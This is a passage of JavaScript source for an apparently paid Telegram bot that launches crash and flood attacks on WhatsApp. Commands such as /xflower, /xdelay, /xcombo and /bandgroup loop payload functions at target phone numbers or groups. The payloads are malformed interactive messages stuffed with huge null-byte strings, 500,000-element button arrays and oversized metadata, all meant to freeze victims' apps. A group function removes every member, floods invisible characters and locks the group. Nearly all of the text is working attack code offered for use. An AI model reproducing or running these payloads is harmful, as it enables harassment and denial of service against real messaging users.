┊ Target: ${q}
┊ Type: WhatsApp Delay Freeze 
┊ Status: ✅ Success
</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
      ]]
    }
  });
});

bot.command("xspam", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("xspam")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMessage = await ctx.replyWithPhoto(
    "https://ganga--link--ghhzdp9sv8hk.code.run/i/ei3e9914",
    {
      caption: `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME</b>
━━━━━━━━━━━━━━⪼
┊ Target: ${q}
┊ Type: Freeze Invisible Spam Free
┊ Status: ✅ Success 
</pre></blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
        ]]
      }
    }
  );

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 7; i++) {
    await Rafibommm(sock, target)
    await Rena4YouDelayInvis(sock, target)
    await sleep(600);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME</b>
━━━━━━━━━━━━━━⪼
┊ Target: ${q}
┊ Type: Freeze Invisible Spam Free
┊ Status: ✅ Success
</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
      ]]
    }
  });
});


bot.command("xflower", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("xflower")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xflower 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMessage = await ctx.replyWithPhoto(
    "https://ganga--link--ghhzdp9sv8hk.code.run/i/ei3e9914",
    {
      caption: `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME</b>
━━━━━━━━━━━━━━⪼
┊ Target: ${q}
┊ Type: Freeze Invisible Hard
┊ Status: ✅ Success 
</pre></blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
        ]]
      }
    }
  );

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 60; i++) {
    await crasOneHit(sock, target)
    await Rena4YouJustFriend(sock, target)
    await sleep(800);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME</b>
━━━━━━━━━━━━━━⪼
┊ Target: ${q}
┊ Type: Freeze Invisible Hard
┊ Status: ✅ Success
</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
      ]]
    }
  });
});


bot.command("xstorm", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("xstorm")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xstorm 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMessage = await ctx.replyWithPhoto(
    "https://ganga--link--ghhzdp9sv8hk.code.run/i/ei3e9914",
    {
      caption: `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME</b>
━━━━━━━━━━━━━━⪼
┊ Target: ${q}
┊ Type: Blank WhatsApp Invisible 
┊ Status: ✅ Success 
</pre></blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
        ]]
      }
    }
  );

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 30; i++) {
    await depai(sock, target)
    await Rena4YouJustTry(sock, target)
    await sleep(800);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME</b>
━━━━━━━━━━━━━━⪼
┊ Target: ${q}
┊ Type: Blank WhatsApp Invisible 
┊ Status: ✅ Success
</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
      ]]
    }
  });
});

bot.command("xdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("xdelay")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMessage = await ctx.replyWithPhoto(
    "https://ganga--link--ghhzdp9sv8hk.code.run/i/ei3e9914",
    {
      caption: `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME</b>
━━━━━━━━━━━━━━⪼
┊ Target: ${q}
┊ Type: Delay WhatsApp 
┊ Status: ✅ Success 
</pre></blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
        ]]
      }
    }
  );

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await crasOneHit(sock, target);
    await XcrasXU(sock, target)
    await sleep(800);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME</b>
━━━━━━━━━━━━━━⪼
┊ Target: ${q}
┊ Type: Delay WhatsApp 
┊ Status: ✅ Success
</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
      ]]
    }
  });
});



bot.command("groupid", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /groupid <link grup WhatsApp>");

  if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");

  // Ambil invite code dari link
  const match = args.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
  if (!match) return ctx.reply("❌ ☇ Link tidak valid, pastikan formatnya benar");

  const inviteCode = match[1];

  try {
    const info = await sock.groupGetInviteInfo(inviteCode);

    const groupMenu = `\`\`\`js
INFO GRUP
☐ Nama: ${info.subject}
☐ ID: ${info.id}
☐ Anggota: ${info.size ?? info.participants?.length ?? "-"}
☐ Owner: ${info.owner ?? "-"}
\`\`\``;

    return ctx.reply(groupMenu, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ ☇ Gagal mengambil info grup. Link mungkin sudah tidak valid/kadaluarsa");
  }
});


//============( Bug Group ) =======\\m
bot.command("bandgroup", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("bandgroup")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /bandgroup gid-123456789`);

  let target = q.trim();
  let groupLinkUsed = false;
  let inviteCode = "";

  if (target.includes("chat.whatsapp.com")) {
    try {
      const match = target.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);
      if (!match) throw new Error("Invalid invite link");
      inviteCode = match[1];
      const groupInfo = await sock.groupGetInviteInfo(inviteCode);
      if (!groupInfo || !groupInfo.id) throw new Error("Gagal mendapatkan ID group");
      target = groupInfo.id;
      groupLinkUsed = true;
      await ctx.reply(`✅ Group ditemukan: ${groupInfo.subject || target}\n🔗 Invite dari: ${inviteCode}`);
    } catch (err) {
      return ctx.reply(`❌ Gagal memproses link group: ${err.message || "Link tidak valid atau group tidak ditemukan"}`);
    }
  } else {
    if (!target.includes("@g.us")) {
      if (/^gid-\d+$/.test(target) || /^\d+$/.test(target)) {
        if (/^\d+$/.test(target)) target = "gid-" + target + "@g.us";
        else target = target + "@g.us";
      } else {
        return ctx.reply("❌ Format salah! Gunakan ID group (gid-123456789) atau link invite WhatsApp");
      }
    }
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `\`\`\`js
𑁍┊GLORY EXITUS PRIME
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${groupLinkUsed ? inviteCode : q}
┊々 JID: ${target}
┊々 Type: Carousel Group Crash
┊々 Status: Process
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Group", url: groupLinkUsed ? `https://chat.whatsapp.com/${inviteCode}` : `https://chat.whatsapp.com/${target.replace('@g.us','').replace('gid-','')}`, style: "primary"}
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await Bangb(sock, target)
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`js
𑁍┊GLORY EXITUS PRIME
© 2026 - 2027 | All Rights Reserved
━━━━━━━━━━━━━━⪼
┊々 Target : ${groupLinkUsed ? inviteCode : q}
┊々 JID : ${target}
┊々 Status : Success
┊々 Result : Group lagi nangis tuu 😹
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Group", url: groupLinkUsed ? `https://chat.whatsapp.com/${inviteCode}` : `https://chat.whatsapp.com/${target.replace('@g.us','').replace('gid-','')}`, style: "primary"}
      ]]
    }
  });
});

bot.command("slaughterer", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const blocked = getBlocked();
  if (blocked.includes("slaughterer")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /slaughterer 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMessage = await ctx.replyWithPhoto(
    "https://ganga--link--ghhzdp9sv8hk.code.run/i/ei3e9914",
    {
      caption: `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME</b>
━━━━━━━━━━━━━━⪼
┊ Target: ${q}
┊ Status: Processing...
</pre></blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
        ]]
      }
    }
  );

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await crasOneHit(sock, target);
    await XcrasXU(sock, target);
    await sleep(800);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME</b>
━━━━━━━━━━━━━━⪼
┊ Target: ${q}
┊ Status: ✅ Success
</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
      ]]
    }
  });
});

bot.command("xcombo", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    const text = ctx.message.text;
    const args = text.split(" ").slice(1).join(" ");

    if (!args) {
        return ctx.reply(
            "❌ *Format salah*\n\n" +
            "📌 Contoh:\n" +
            "`/xcombo 62xxx, 62xxxx, 62xxxxx`"
        );
    }

    const numbers = args
        .split(",")
        .map(v => v.replace(/[^0-9]/g, ""))
        .filter(v => v.length > 5);

    if (numbers.length === 0) {
        return ctx.reply("❌ Tidak ada nomor valid yang bisa diproses.");
    }

    const targets = numbers.map(n => n + "@s.whatsapp.net");
    const totalTarget = targets.length;

    let progressMsg = await ctx.reply(
        "🚀 *MULTI BUG STARTED*\n\n" +
        `🎯 Total Target : ${totalTarget}\n` +
        `⏳ Status       : Initializing...\n` +
        `📊 Progress     : 0%`
    );

    for (let index = 0; index < targets.length; index++) {
        const target = targets[index];
        const current = index + 1;
        const percent = Math.floor((current / totalTarget) * 100);

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            progressMsg.message_id,
            null,
            "⚡ *MULTI BUG IN PROGRESS*\n\n" +
            `🎯 Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
            `📌 Urutan        : ${current} / ${totalTarget}\n` +
            `📊 Progress      : ${percent}%\n` +
            `🛠 Step          : Preparing...`
        );

        const loopBug = 5;
        for (let i = 0; i < loopBug; i++) {
            await sleep(1000);
            await FrezeCombined(sock, target);
            await crasOneHit(sock, target);
            await sleep(700);

            console.log(`⚔️ MULTI NUMBER BUG → ${target} | Loop ${i + 1}/${loopBug}`);
        }

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            progressMsg.message_id,
            null,
            "⚡ *MULTI BUG IN PROGRESS*\n\n" +
            `🎯 Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
            `📌 Urutan        : ${current} / ${totalTarget}\n` +
            `📊 Progress      : ${percent}%\n` +
            `✅ Status        : Target selesai`
        );

        await sleep(1500);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        "✅ *MULTI BUG COMPLETED*\n\n" +
        `🎯 Total Target : ${totalTarget}\n` +
        `📊 Progress     : 100%\n` +
        `🔥 Status       : All target processed`
    );
});



bot.command("cekidgroup", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  try {
    const text = ctx.message.text;
    const link = text.split(" ")[1];

    if (!link)
      return ctx.reply("🪧 ☇ Format: /cekidgroup https://chat.whatsapp.com/xxxxx");

    const match = link.match(
      /chat\.whatsapp\.com\/([A-Za-z0-9_-]{10,})/
    );

    if (!match)
      return ctx.reply("❌ ☇ Link grup tidak valid");

    const inviteCode = match[1];

    if (!sock)
      return ctx.reply("❌ ☇ Socket belum siap");

    const info = await sock.groupGetInviteInfo(inviteCode);

    const groupId = info.id;
    const subject = info.subject || "-";
    const owner = info.owner || "-";
    const size = info.size || 0;

    await ctx.reply(`
<blockquote><strong>GLORY EXITUS
│ ⸙ Name
│ᯓ➤ ${subject}
│ ⸙ Group ID
│ᯓ➤ ${groupId}
│ ⸙ Owner
│ᯓ➤ ${owner}
│ ⸙ Members
│ᯓ➤ ${size}
╰═─────────────═⬡</strong></blockquote>
`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    ctx.reply("❌ ☇ Gagal mengambil Id grup");
  }
});
//============( FUNCTION ) =======\\m
async function Bangb(sock, target) {
    let group = target.includes("@g.us") ? target : target + "@g.us";
    let members = await sock.groupMetadata(group);

    for (i = 0; i < 20; i++) {
        try {
            for (let m of members.participants) {
                let id = m.id;
                if (id !== sock.user.id) {
                    await sock.groupParticipantsUpdate(group, [id], "remove");
                    await new Promise(r => setTimeout(r, 15));
                }
            }

            await sock.groupParticipantsUpdate(group, ["0@s.whatsapp.net"], "add");
            await new Promise(r => setTimeout(r, 10));
            await sock.groupParticipantsUpdate(group, ["0@s.whatsapp.net"], "remove");

            await sock.sendMessage(group, {
                text: "\u200B".repeat(3000) + "\u0000".repeat(3000) + "\u202E".repeat(1000)
            });

            await sock.groupSettingsUpdate(group, "announcement", true);
            await sock.groupSettingsUpdate(group, "locked", true);
        } catch (e) {}
    }
}



async function Rena4YouJustTry(sock, target) {
    const basePayload = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " ",
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: "\u001A".repeat(500000)
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true
                    }
                }
            }
        }
    };

    // 1. Payload bokep1
    await sock.relayMessage(target, basePayload, { noSelfSync: true });

    // 2. interactiveResponseMessage (call_permission_request)
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "\u0000".repeat(200000),
                        title: "\u0000".repeat(200000),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(500000),
                        version: 3
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true
                    }
                }
            }
        }
    }, { noSelfSync: true });

    // 3. viewOnceMessage (galaxy_message)
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0000".repeat(300000),
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: "\u0000".repeat(600000),
                                version: 3
                            },
                            contextInfo: {
                                mentionedJid: [target],
                                isForwarded: true
                            }
                        }
                    }
                }
            }
        }
    }, { noSelfSync: true });

    // 4. interactiveMessage (quick_reply buttons)
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u0000".repeat(150000),
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500 }, () => ({
                            name: "quick_reply",
                            buttonParamsJson: JSON.stringify({
                                display_text: "\u0000".repeat(50000),
                                id: "crash".repeat(50000)
                            })
                        }))
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true
                    }
                }
            }
        }
    }, { noSelfSync: true });

    // 5. interactiveResponseMessage (call_permission_request with Buffer)
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: Buffer.alloc(500000, '\u0000').toString(),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: Buffer.alloc(1000000, '\u0000').toString(),
                        version: 3
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true
                    }
                }
            }
        }
    }, { noSelfSync: true });

    // 6. botForwardedMessage (latexMetadata)
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                botForwardedMessage: {
                    message: {
                        richResponseMessage: {
                            messageType: 1,
                            submessages: [
                                {
                                    messageType: 8,
                                    latexMetadata: {
                                        text: " ",
                                        expressions: [
                                            {
                                                latexExpression: " ",
                                                url: "https://t.me/RenaOffc",
                                                fontHeight: 9999999
                                            }
                                        ]
                                    }
                                }
                            ],
                            contextInfo: {
                                forwardingScore: 99999,
                                isForwarded: true,
                                forwardedAiBotMessageInfo: {
                                    botJid: "867051314767696@bot"
                                },
                                forwardOrigin: 4,
                                mentionedJid: [target]
                            }
                        }
                    }
                }
            }
        }
    }, { noSelfSync: true });

    // 7. botForwardedMessage (tableMetadata + latex)
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                botForwardedMessage: {
                    message: {
                        richResponseMessage: {
                            messageType: 1,
                            submessages: [
                                {
                                    messageType: 8,
                                    latexMetadata: {
                                        text: "\u0000".repeat(10000) + " ",
                                        expressions: [
                                            {
                                                latexExpression: " ",
                                                fontHeight: 9999999
                                            }
                                        ]
                                    }
                                },
                                {
                                    messageType: 4,
                                    tableMetadata: {
                                        title: "\0",
                                        rows: [
                                            {
                                                items: ["\0"],
                                                isHeading: true
                                            }
                                        ]
                                    }
                                }
                            ],
                            contextInfo: {
                                forwardingScore: 99999,
                                isForwarded: true,
                                forwardedAiBotMessageInfo: {
                                    botJid: "867051314767696@bot"
                                },
                                forwardOrigin: 4,
                                stanzaId: "Rena4You_" + Date.now(),
                                participant: target,
                                remoteJid: target,
                                mentionedJid: [target]
                            }
                        }
                    }
                }
            }
        }
    }, { noSelfSync: true });

    // 8. bokep2 (duplicate of basePayload)
    await sock.relayMessage(target, basePayload, { noSelfSync: true });

    // 9. viewOnceMessage (interactiveMessage with extra)
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: {
                                text: "\u0000".repeat(50000) + "Rena4You𑇂𑆵𑆴𑆿" + "\u0000".repeat(50000),
                                format: "DEFAULT"
                            },
                            nativeFlowMessage: {
                                extra: "\u0000".repeat(50000),
                                buttons: "A".repeat(20000)
                            },
                            contextInfo: {
                                mentionedJid: [target],
                                isForwarded: true
                            }
                        }
                    }
                }
            }
        }
    }, { noSelfSync: true });

    // 10. interactiveMessage (500k array)
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Rena4You𑇂𑆵𑆴𑆿",
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true
                    }
                }
            }
        }
    }, { noSelfSync: true });

    // 11. interactiveMessage (1000 array + mention)
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Rena4You𑇂𑆵𑆴𑆿𑆿",
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 1000 }, () => ({}))
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () =>
                            Math.floor(Math.random() * 9000000000) + "@s.whatsapp.net"
                        ),
                        forwardingScore: 999999999,
                        isForwarded: true
                    }
                }
            }
        }
    }, { noSelfSync: true });

    // 12. interactiveMessage (view_ai_message)
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u0000".repeat(60000),
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: "view_ai_message".repeat(100000)
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true
                    }
                }
            }
        }
    }, { noSelfSync: true });
}


async function XcrasXU(sock, target) {
    for (let i = 0; i < 5; i++) {
        const crashXG = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "Nando Officiall 隆!",
                            hasMediaAttachment: true,
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: Buffer.from("7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=", 'base64'),
                                fileLength: 999999999,
                                pageCount: 1000,
                                mediaKey: Buffer.from("oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=", 'base64'),
                                fileName: "nando.PDF",
                                fileEncSha256: Buffer.from("IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=", 'base64'),
                                directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1779839963",
                                thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
                                thumbnailSha256: Buffer.from("xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=", 'base64'),
                                thumbnailEncSha256: Buffer.from("2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=", 'base64'),
                                jpegThumbnail: null,
                                contextInfo: {},
                                thumbnailHeight: 999,
                                thumbnailWidth: 999
                            }
                        },
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        };

        const crashXH = generateWAMessageFromContent(target, crashXG, {});
        await sock.relayMessage(target, crashXH.message, {
            noSelfSync: true,
            messageId: crashXH.key.id
        });

        const crashXI = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Nando Officiall 隆!"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                        contextInfo: {
                            quotedMessage: {
                                contactMessage: {
                                    displayName: " ",
                                    vcard: null
                                }
                            }
                        }
                    }
                }
            }
        };

        const crashXJ = generateWAMessageFromContent(target, crashXI, {});
        await sock.relayMessage(target, crashXJ.message, {
            noSelfSync: true,
            messageId: crashXJ.key.id
        });

        await new Promise(r => setTimeout(r, 800));
    }
}


async function crasOneHit(sock, target) {
    const MakLo = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "MakLoo¡!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "MakLo¡!",
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 499999 }, () => ({}))
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, MakLo, {});

    for (let i = 0; i < 10; i++) {
        await sock.relayMessage(target, msg.message, {
            noSelfSync: true,
            messageId: msg.key.id
        });
        await sleep(1000);
    }
}

async function DelayXxAh(sock, target) {
    const AXcrb = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "Nando隆!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "Nando Officiall 隆!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const yandex = generateWAMessageFromContent(target, AXcrb, {});
    await sock.relayMessage(target, yandex.message, {
        noSelfSync: true,
        messageId: yandex.key.id
    });

    const CrBLLC = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: "Nando Officiall 隆!",
                                rows: Array.from({ length: 299999 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "CRB"
                        },
                        forwardOrigin: 4
